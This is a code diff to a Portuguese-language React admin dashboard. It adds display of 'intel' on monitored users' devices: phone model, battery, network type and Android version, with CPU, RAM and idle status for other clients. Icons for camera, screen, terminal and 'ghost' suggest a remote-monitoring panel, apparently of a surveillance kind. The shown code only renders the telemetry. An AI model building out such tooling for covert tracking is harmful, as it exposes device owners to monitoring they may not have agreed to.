@@ -4,7 +4,7 @@ import { useEffect, useState, useCallback } from 'react';
 // import { collection, query, onSnapshot, doc, updateDoc, where, Timestamp } from 'firebase/firestore'; // Firestore removed
 import { useAuth } from '@/components/auth-provider';
 import { useRouter } from 'next/navigation';
-import { MapPin, Monitor, Eye, Image as ImageIcon, MessageSquare, ExternalLink, ShieldCheck, Activity, User, Globe, X, Laptop, RefreshCw, MonitorPlay, Camera, Smartphone, PlayCircle, Download, Bell, Terminal, VolumeX, Trash2, Zap, Database, Fingerprint, Mail, Ghost, Star, History, Compass, LayoutGrid, Lock, Unlock } from 'lucide-react';
+import { MapPin, Monitor, Eye, Image as ImageIcon, MessageSquare, ExternalLink, ShieldCheck, Activity, User, Globe, X, Laptop, RefreshCw, MonitorPlay, Camera, Smartphone, PlayCircle, Download, Bell, Terminal, VolumeX, Trash2, Zap, Database, Fingerprint, Mail, Ghost, Star, History, Compass, LayoutGrid, Lock, Unlock, Battery, Signal } from 'lucide-react';
 
 export default function AdminDashboard() {
     const { user, loading, logout, login } = useAuth();
@@ -311,14 +311,37 @@ export default function AdminDashboard() {
 
                                         {selectedUser.intel ? (
                                             <div className="grid grid-cols-2 gap-4">
-                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
-                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Processador</p>
-                                                    <p className="text-white text-[10px] font-bold truncate leading-tight">{selectedUser.intel.cpu?.modelName || 'Desconhecido'}</p>
-                                                </div>
-                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
-                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Memória RAM</p>
-                                                    <p className="text-white text-[10px] font-bold">{selectedUser.intel.memory?.available} / {selectedUser.intel.memory?.capacity}</p>
-                                                </div>
+                                                {selectedUser.intel.source === 'MOBILE_APP' ? (
+                                                    <>
+                                                        <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
+                                                            <p className="text-[7px] text-zinc-600 uppercase font-black mb-1 flex items-center gap-1"><Smartphone size={8} /> Dispositivo</p>
+                                                            <p className="text-white text-[10px] font-bold truncate leading-tight">{selectedUser.intel.manufacturer} {selectedUser.intel.model}</p>
+                                                        </div>
+                                                        <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
+                                                            <p className="text-[7px] text-zinc-600 uppercase font-black mb-1 flex items-center gap-1"><Battery size={8} /> Bateria</p>
+                                                            <p className="text-white text-[10px] font-bold">{(selectedUser.intel.batteryLevel * 100).toFixed(0)}% {selectedUser.intel.isCharging ? '(Carregando)' : ''}</p>
+                                                        </div>
+                                                        <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
+                                                            <p className="text-[7px] text-zinc-600 uppercase font-black mb-1 flex items-center gap-1"><Signal size={8} /> Rede</p>
+                                                            <p className="text-white text-[10px] font-bold uppercase">{selectedUser.intel.networkType}</p>
+                                                        </div>
+                                                        <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
+                                                            <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">OS Version</p>
+                                                            <p className="text-white text-[10px] font-bold">Android {selectedUser.intel.osVersion}</p>
+                                                        </div>
+                                                    </>
+                                                ) : (
+                                                    <>
+                                                        <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
+                                                            <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Processador</p>
+                                                            <p className="text-white text-[10px] font-bold truncate leading-tight">{selectedUser.intel.cpu?.modelName || 'Desconhecido'}</p>
+                                                        </div>
+                                                        <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
+                                                            <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Memória RAM</p>
+                                                            <p className="text-white text-[10px] font-bold">{selectedUser.intel.memory?.available} / {selectedUser.intel.memory?.capacity}</p>
+                                                        </div>
+                                                    </>
+                                                )}
                                                 <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
                                                     <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Status de Atividade</p>
                                                     <p className={`text-[10px] font-black uppercase ${selectedUser.intel.idleState === 'active' ? 'text-emerald-500' : 'text-amber-500'}`}>
